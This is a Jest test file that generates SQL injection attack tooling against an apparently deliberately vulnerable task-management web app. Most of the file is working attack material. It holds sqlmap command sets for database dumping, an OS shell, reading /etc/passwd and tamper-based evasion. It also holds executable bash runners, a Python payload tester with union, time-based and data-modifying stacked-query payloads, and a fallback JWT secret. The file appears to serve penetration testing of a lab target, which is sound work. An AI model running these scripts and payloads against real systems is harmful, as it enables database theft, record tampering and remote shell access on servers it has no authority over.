import request from 'supertest';
import { app } from '../../src/server';
import { setupTestDatabase, testUsers } from '../setup';
import jwt from 'jsonwebtoken';
import * as fs from 'fs';
import * as path from 'path';

describe('SQLMap Integration Tests', () => {
  let user1Token: string;
  let user1Id: number;
  let baseUrl: string;

  beforeAll(async () => {
    const users = await setupTestDatabase();
    user1Id = users.user1.id;

    user1Token = jwt.sign(
      { userId: user1Id, email: testUsers.user1.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    baseUrl = process.env.TEST_BASE_URL || 'http://localhost:3000';
  });

  describe('SQLMap Configuration Generation', () => {
    test('should generate SQLMap configuration file', async () => {
      const sqlmapConfig = {
        target: `${baseUrl}/api/tasks/search?query=test`,
        headers: {
          'Authorization': `Bearer ${user1Token}`,
          'Content-Type': 'application/json',
          'User-Agent': 'SQLMap/1.7.2'
        },
        parameters: {
          'query': 'test'
        },
        techniques: 'BEUSTQ', // Boolean, Error, Union, Stacked, Time, Query
        dbms: 'postgresql',
        level: 5,
        risk: 3,
        threads: 10,
        batch: true,
        output: './reports/sqlmap',
        dumpAll: true,
        excludeSysDbs: false,
        tamper: [
          'space2comment',
          'randomcase',
          'charencode'
        ]
      };

      const configPath = path.join(__dirname, '../reports/sqlmap-config.json');
      fs.mkdirSync(path.dirname(configPath), { recursive: true });
      fs.writeFileSync(configPath, JSON.stringify(sqlmapConfig, null, 2));

      expect(fs.existsSync(configPath)).toBe(true);
    });

    test('should create SQLMap command scripts', async () => {
      const sqlmapCommands = {
        basic: `sqlmap -u "${baseUrl}/api/tasks/search?query=test" \\
  --header="Authorization: Bearer ${user1Token}" \\
  --batch \\
  --level=3 \\
  --risk=2 \\
  --dbms=postgresql \\
  --technique=BEUSTQ \\
  --output-dir=./reports/sqlmap/basic`,

        enumeration: `sqlmap -u "${baseUrl}/api/tasks/search?query=test" \\
  --header="Authorization: Bearer ${user1Token}" \\
  --batch \\
  --dbs \\
  --tables \\
  --columns \\
  --schema \\
  --count \\
  --output-dir=./reports/sqlmap/enum`,

        dataExtraction: `sqlmap -u "${baseUrl}/api/tasks/search?query=test" \\
  --header="Authorization: Bearer ${user1Token}" \\
  --batch \\
  --dump-all \\
  --exclude-sysdbs \\
  --output-dir=./reports/sqlmap/dump`,

        advanced: `sqlmap -u "${baseUrl}/api/tasks/search?query=test" \\
  --header="Authorization: Bearer ${user1Token}" \\
  --batch \\
  --level=5 \\
  --risk=3 \\
  --tamper=space2comment,randomcase,charencode \\
  --threads=10 \\
  --time-sec=10 \\
  --union-cols=6 \\
  --output-dir=./reports/sqlmap/advanced`,

        osShell: `sqlmap -u "${baseUrl}/api/tasks/search?query=test" \\
  --header="Authorization: Bearer ${user1Token}" \\
  --batch \\
  --os-shell \\
  --output-dir=./reports/sqlmap/shell`,

        fileSystem: `sqlmap -u "${baseUrl}/api/tasks/search?query=test" \\
  --header="Authorization: Bearer ${user1Token}" \\
  --batch \\
  --file-read="/etc/passwd" \\
  --file-write="./test-upload.txt" \\
  --file-dest="/tmp/test-upload.txt" \\
  --output-dir=./reports/sqlmap/files`
      };

      const scriptContent = `#!/bin/bash

# SQLMap Integration Scripts for Vulnerable Web Application
# Generated automatically for penetration testing

set -e

BASE_URL="${baseUrl}"
TOKEN="${user1Token}"
OUTPUT_DIR="./reports/sqlmap"

echo "Starting SQLMap penetration testing..."
echo "Target: \$BASE_URL"
echo "Output Directory: \$OUTPUT_DIR"

# Create output directory
mkdir -p \$OUTPUT_DIR

# Function to run SQLMap with error handling
run_sqlmap() {
    local name=\$1
    local cmd=\$2
    echo "Running \$name test..."
    if eval \$cmd; then
        echo "✓ \$name test completed successfully"
    else
        echo "✗ \$name test failed"
    fi
    echo ""
}

# Basic SQL injection detection
run_sqlmap "Basic Detection" "${sqlmapCommands.basic}"

# Database enumeration
run_sqlmap "Database Enumeration" "${sqlmapCommands.enumeration}"

# Data extraction
run_sqlmap "Data Extraction" "${sqlmapCommands.dataExtraction}"

# Advanced techniques
run_sqlmap "Advanced Techniques" "${sqlmapCommands.advanced}"

# OS shell (if possible)
run_sqlmap "OS Shell" "${sqlmapCommands.osShell}"

# File system access
run_sqlmap "File System Access" "${sqlmapCommands.fileSystem}"

echo "SQLMap testing completed. Check \$OUTPUT_DIR for results."
`;

      const scriptPath = path.join(__dirname, '../scripts/run-sqlmap.sh');
      fs.mkdirSync(path.dirname(scriptPath), { recursive: true });
      fs.writeFileSync(scriptPath, scriptContent);
      fs.chmodSync(scriptPath, '755');

      expect(fs.existsSync(scriptPath)).toBe(true);
    });
  });

  describe('SQLMap Request Templates', () => {
    test('should create SQLMap request templates', async () => {
      const requestTemplates = {
        searchEndpoint: {
          url: `${baseUrl}/api/tasks/search`,
          method: 'GET',
          parameters: {
            query: 'INJECT_HERE'
          },
          headers: {
            'Authorization': `Bearer ${user1Token}`,
            'Content-Type': 'application/json'
          },
          sqlmapOptions: [
            '--batch',
            '--level=3',
            '--risk=2',
            '--technique=BEUSTQ',
            '--dbms=postgresql'
          ]
        },
        
        postEndpoint: {
          url: `${baseUrl}/api/tasks`,
          method: 'POST',
          data: {
            title: 'INJECT_HERE',
            description: 'Test task',
            priority: 'MEDIUM',
            status: 'TODO'
          },
          headers: {
            'Authorization': `Bearer ${user1Token}`,
            'Content-Type': 'application/json'
          },
          sqlmapOptions: [
            '--batch',
            '--data={"title":"INJECT_HERE","description":"Test task","priority":"MEDIUM","status":"TODO"}',
            '--level=3',
            '--risk=2'
          ]
        },

        commentEndpoint: {
          url: `${baseUrl}/api/comments/task/1`,
          method: 'POST',
          data: {
            content: 'INJECT_HERE'
          },
          headers: {
            'Authorization': `Bearer ${user1Token}`,
            'Content-Type': 'application/json'
          },
          sqlmapOptions: [
            '--batch',
            '--data={"content":"INJECT_HERE"}',
            '--level=4',
            '--risk=3'
          ]
        }
      };

      // Generate individual SQLMap commands for each template
      const commands = Object.entries(requestTemplates).map(([name, template]) => {
        if (template.method === 'GET') {
          return {
            name,
            command: `sqlmap -u "${template.url}?${Object.keys(template.parameters).map(key => `${key}=${template.parameters[key]}`).join('&')}" ${template.sqlmapOptions.map(opt => `${opt}`).join(' ')} --header="${Object.entries(template.headers).map(([key, value]) => `${key}: ${value}`).join('" --header="')}"`
          };
        } else {
          return {
            name,
            command: `sqlmap -u "${template.url}" ${template.sqlmapOptions.join(' ')} --header="${Object.entries(template.headers).map(([key, value]) => `${key}: ${value}`).join('" --header="')}"`
          };
        }
      });

      const templatesPath = path.join(__dirname, '../reports/sqlmap-templates.json');
      fs.writeFileSync(templatesPath, JSON.stringify({ templates: requestTemplates, commands }, null, 2));

      expect(fs.existsSync(templatesPath)).toBe(true);
    });

    test('should create SQLMap payload testing script', async () => {
      const payloadScript = `#!/usr/bin/env python3

import requests
import json
import time
import sys
from urllib.parse import quote

class SQLMapPayloadTester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'SQLMapPayloadTester/1.0'
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def test_payload(self, endpoint, payload, method='GET', data=None):
        """Test a single SQL injection payload"""
        try:
            url = f"{self.base_url}{endpoint}"
            
            if method == 'GET':
                url += f"?query={quote(payload)}"
                response = self.session.get(url, timeout=10)
            else:
                if data:
                    data['content'] = payload
                response = self.session.post(url, json=data, timeout=10)
            
            return {
                'payload': payload,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.text),
                'error_indicators': self.check_error_indicators(response.text),
                'success_indicators': self.check_success_indicators(response.text, response.status_code)
            }
        except Exception as e:
            return {
                'payload': payload,
                'error': str(e),
                'status_code': None
            }

    def check_error_indicators(self, response_text):
        """Check for SQL error indicators in response"""
        error_patterns = [
            'syntax error',
            'postgresql',
            'pg_',
            'relation does not exist',
            'column does not exist',
            'unterminated quoted string',
            'invalid input syntax',
            'duplicate key value',
            'permission denied'
        ]
        
        found_errors = []
        response_lower = response_text.lower()
        
        for pattern in error_patterns:
            if pattern in response_lower:
                found_errors.append(pattern)
        
        return found_errors

    def check_success_indicators(self, response_text, status_code):
        """Check for successful injection indicators"""
        indicators = []
        
        # Check for union-based injection success
        if 'email' in response_text and 'password_hash' in response_text:
            indicators.append('union_injection_success')
        
        # Check for boolean-based injection
        if status_code == 200 and len(response_text) > 100:
            indicators.append('boolean_injection_possible')
        
        # Check for time-based injection (would need timing analysis)
        if status_code == 200:
            indicators.append('time_injection_possible')
        
        return indicators

    def run_payload_tests(self):
        """Run comprehensive payload testing"""
        payloads = [
            # Basic injection tests
            "'",
            "''",
            "\\"",
            "\\"\\"",
            
            # Union-based payloads
            "' UNION SELECT 1,2,3,4,5,6--",
            "' UNION SELECT id,email,password_hash,first_name,last_name,created_at FROM users--",
            "' UNION SELECT table_name,column_name,data_type,'1','2','3' FROM information_schema.columns--",
            
            # Boolean-based payloads
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT SUBSTRING(email,1,1) FROM users LIMIT 1) = 'a'--",
            
            # Error-based payloads
            "' AND (SELECT * FROM non_existent_table)--",
            "' AND 1=CAST('invalid' AS INTEGER)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            
            # Time-based payloads
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            "' AND (SELECT COUNT(*) FROM pg_sleep(5)) > 0--",
            
            # Stacked queries
            "'; INSERT INTO tasks (user_id,title,description,priority,status) VALUES (999,'Injected','SQLMap Test','HIGH','TODO')--",
            "'; UPDATE users SET email='hacked@test.com' WHERE id=1--",
            
            # Advanced payloads
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3,4,5,6 FROM dual--",
            "' OR 'x'='x",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            "' OR 1=1/*"
        ]
        
        results = []
        
        print(f"Testing {len(payloads)} SQL injection payloads...")
        
        for i, payload in enumerate(payloads, 1):
            print(f"Testing payload {i}/{len(payloads)}: {payload[:50]}...")
            
            # Test GET endpoint
            result = self.test_payload('/api/tasks/search', payload)
            result['endpoint'] = '/api/tasks/search'
            result['method'] = 'GET'
            results.append(result)
            
            # Test POST endpoint
            result = self.test_payload('/api/comments/task/1', payload, 'POST', {'content': payload})
            result['endpoint'] = '/api/comments/task/1'
            result['method'] = 'POST'
            results.append(result)
            
            time.sleep(0.1)  # Rate limiting
        
        return results

    def generate_report(self, results):
        """Generate SQLMap-style report"""
        report = {
            'target': self.base_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_payloads': len(results),
            'successful_injections': [],
            'error_based_injections': [],
            'potential_injections': [],
            'failed_injections': []
        }
        
        for result in results:
            if 'error' in result:
                report['failed_injections'].append(result)
            elif result.get('success_indicators'):
                report['successful_injections'].append(result)
            elif result.get('error_indicators'):
                report['error_based_injections'].append(result)
            elif result.get('status_code') == 200:
                report['potential_injections'].append(result)
            else:
                report['failed_injections'].append(result)
        
        return report

if __name__ == '__main__':
    base_url = sys.argv[1] if len(sys.argv) > 1 else '${baseUrl}'
    token = sys.argv[2] if len(sys.argv) > 2 else '${user1Token}'
    
    tester = SQLMapPayloadTester(base_url, token)
    results = tester.run_payload_tests()
    report = tester.generate_report(results)
    
    # Save report
    with open('./reports/sqlmap-payload-test.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\\nTesting completed!")
    print(f"Total payloads tested: {report['total_payloads']}")
    print(f"Successful injections: {len(report['successful_injections'])}")
    print(f"Error-based injections: {len(report['error_based_injections'])}")
    print(f"Potential injections: {len(report['potential_injections'])}")
    print(f"Failed injections: {len(report['failed_injections'])}")
    print(f"Report saved to: ./reports/sqlmap-payload-test.json")
`;

      const scriptPath = path.join(__dirname, '../scripts/sqlmap-payload-tester.py');
      fs.mkdirSync(path.dirname(scriptPath), { recursive: true });
      fs.writeFileSync(scriptPath, payloadScript);
      fs.chmodSync(scriptPath, '755');

      expect(fs.existsSync(scriptPath)).toBe(true);
    });
  });

  describe('SQLMap Automation', () => {
    test('should create automated SQLMap testing pipeline', async () => {
      const pipelineScript = `#!/bin/bash

# Automated SQLMap Testing Pipeline
# This script runs comprehensive SQL injection testing using SQLMap

set -e

# Configuration
BASE_URL="${baseUrl}"
TOKEN="${user1Token}"
OUTPUT_DIR="./reports/sqlmap-pipeline"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
REPORT_DIR="\$OUTPUT_DIR/\$TIMESTAMP"

# Colors for output
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
NC='\\033[0m' # No Color

echo -e "\${GREEN}Starting SQLMap Testing Pipeline\${NC}"
echo "Target: \$BASE_URL"
echo "Report Directory: \$REPORT_DIR"
echo "Timestamp: \$TIMESTAMP"
echo ""

# Create directories
mkdir -p "\$REPORT_DIR"/{basic,enum,dump,advanced,custom}

# Function to log with timestamp
log() {
    echo -e "[\$(date '+%Y-%m-%d %H:%M:%S')] \$1"
}

# Function to run SQLMap with logging
run_sqlmap() {
    local test_name="\$1"
    local output_dir="\$2"
    local sqlmap_cmd="\$3"
    
    log "\${YELLOW}Running \$test_name...\${NC}"
    
    if timeout 300 \$sqlmap_cmd --output-dir="\$output_dir" 2>&1 | tee "\$output_dir/sqlmap.log"; then
        log "\${GREEN}✓ \$test_name completed successfully\${NC}"
        return 0
    else
        log "\${RED}✗ \$test_name failed or timed out\${NC}"
        return 1
    fi
}

# Test 1: Basic SQL Injection Detection
log "Phase 1: Basic SQL Injection Detection"
run_sqlmap "Basic Detection" "\$REPORT_DIR/basic" \\
    "sqlmap -u '\$BASE_URL/api/tasks/search?query=test' \\
     --header='Authorization: Bearer \$TOKEN' \\
     --batch --level=3 --risk=2 --technique=BEUSTQ"

# Test 2: Database Enumeration
log "Phase 2: Database Enumeration"
run_sqlmap "Database Enumeration" "\$REPORT_DIR/enum" \\
    "sqlmap -u '\$BASE_URL/api/tasks/search?query=test' \\
     --header='Authorization: Bearer \$TOKEN' \\
     --batch --dbs --tables --columns --schema"

# Test 3: Data Extraction
log "Phase 3: Data Extraction"
run_sqlmap "Data Extraction" "\$REPORT_DIR/dump" \\
    "sqlmap -u '\$BASE_URL/api/tasks/search?query=test' \\
     --header='Authorization: Bearer \$TOKEN' \\
     --batch --dump-all --exclude-sysdbs"

# Test 4: Advanced Techniques
log "Phase 4: Advanced Techniques"
run_sqlmap "Advanced Techniques" "\$REPORT_DIR/advanced" \\
    "sqlmap -u '\$BASE_URL/api/tasks/search?query=test' \\
     --header='Authorization: Bearer \$TOKEN' \\
     --batch --level=5 --risk=3 \\
     --tamper=space2comment,randomcase,charencode \\
     --threads=5 --time-sec=10"

# Test 5: Custom Payloads
log "Phase 5: Custom Payload Testing"
python3 ../scripts/sqlmap-payload-tester.py "\$BASE_URL" "\$TOKEN"
cp ./reports/sqlmap-payload-test.json "\$REPORT_DIR/custom/"

# Generate summary report
log "Generating summary report..."
cat > "\$REPORT_DIR/summary.txt" << EOF
SQLMap Testing Pipeline Summary
==============================

Target: \$BASE_URL
Timestamp: \$TIMESTAMP
Test Duration: \$(date)

Test Results:
EOF

# Check for successful injections
if find "\$REPORT_DIR" -name "*.csv" -o -name "*.txt" | grep -q .; then
    echo "✓ SQL Injection vulnerabilities found!" >> "\$REPORT_DIR/summary.txt"
    echo "✓ Data extraction successful!" >> "\$REPORT_DIR/summary.txt"
else
    echo "✗ No SQL injection vulnerabilities detected" >> "\$REPORT_DIR/summary.txt"
fi

# List all generated files
echo "" >> "\$REPORT_DIR/summary.txt"
echo "Generated Files:" >> "\$REPORT_DIR/summary.txt"
find "\$REPORT_DIR" -type f -name "*.csv" -o -name "*.txt" -o -name "*.json" | sort >> "\$REPORT_DIR/summary.txt"

log "\${GREEN}SQLMap testing pipeline completed!\${NC}"
log "Results saved to: \$REPORT_DIR"
log "Summary: \$REPORT_DIR/summary.txt"

# Display summary
cat "\$REPORT_DIR/summary.txt"
`;

      const pipelinePath = path.join(__dirname, '../scripts/sqlmap-pipeline.sh');
      fs.writeFileSync(pipelinePath, pipelineScript);
      fs.chmodSync(pipelinePath, '755');

      expect(fs.existsSync(pipelinePath)).toBe(true);
    });
  });

  describe('SQLMap Result Validation', () => {
    test('should validate SQLMap can detect injection points', async () => {
      // Test the vulnerable endpoint manually to ensure it's injectable
      const testPayload = "' OR '1'='1";
      
      const response = await request(app)
        .get(`/api/tasks/search?query=${encodeURIComponent(testPayload)}`)
        .set('Authorization', `Bearer ${user1Token}`);

      // Should either return data (successful injection) or error (detectable injection point)
      expect([200, 500].includes(response.status)).toBe(true);
      
      if (response.status === 500) {
        // Error-based injection detection
        expect(response.body.error).toBeDefined();
      } else {
        // Union-based or boolean-based injection
        expect(Array.isArray(response.body)).toBe(true);
      }
    });

    test('should create SQLMap validation checklist', async () => {
      const validationChecklist = {
        preRequisites: {
          targetAccessible: true,
          authenticationWorking: true,
          vulnerableEndpointsIdentified: [
            '/api/tasks/search',
            '/api/comments/task/{id}',
            '/api/tasks (POST)'
          ],
          sqlmapInstalled: true,
          outputDirectoryCreated: true
        },
        
        testCases: [
          {
            name: 'Basic Injection Detection',
            command: 'sqlmap -u "URL" --batch',
            expectedResult: 'Injection point detected',
            severity: 'HIGH'
          },
          {
            name: 'Database Enumeration',
            command: 'sqlmap -u "URL" --dbs',
            expectedResult: 'Database names extracted',
            severity: 'HIGH'
          },
          {
            name: 'Table Enumeration',
            command: 'sqlmap -u "URL" --tables',
            expectedResult: 'Table names extracted',
            severity: 'HIGH'
          },
          {
            name: 'Data Extraction',
            command: 'sqlmap -u "URL" --dump',
            expectedResult: 'Sensitive data extracted',
            severity: 'CRITICAL'
          },
          {
            name: 'Union-based Injection',
            command: 'sqlmap -u "URL" --technique=U',
            expectedResult: 'Union injection successful',
            severity: 'HIGH'
          },
          {
            name: 'Boolean-based Injection',
            command: 'sqlmap -u "URL" --technique=B',
            expectedResult: 'Boolean injection successful',
            severity: 'MEDIUM'
          },
          {
            name: 'Error-based Injection',
            command: 'sqlmap -u "URL" --technique=E',
            expectedResult: 'Error injection successful',
            severity: 'MEDIUM'
          },
          {
            name: 'Time-based Injection',
            command: 'sqlmap -u "URL" --technique=T',
            expectedResult: 'Time injection successful',
            severity: 'MEDIUM'
          }
        ],
        
        expectedFindings: {
          vulnerabilities: [
            'SQL Injection in search parameter',
            'Database information disclosure',
            'User credential extraction',
            'Privilege escalation potential'
          ],
          extractedData: [
            'User emails and password hashes',
            'Task titles and descriptions',
            'Comment content',
            'Database schema information'
          ],
          riskLevel: 'CRITICAL',
          cvssScore: 9.8
        }
      };

      const checklistPath = path.join(__dirname, '../reports/sqlmap-validation.json');
      fs.writeFileSync(checklistPath, JSON.stringify(validationChecklist, null, 2));

      expect(fs.existsSync(checklistPath)).toBe(true);
    });
  });
});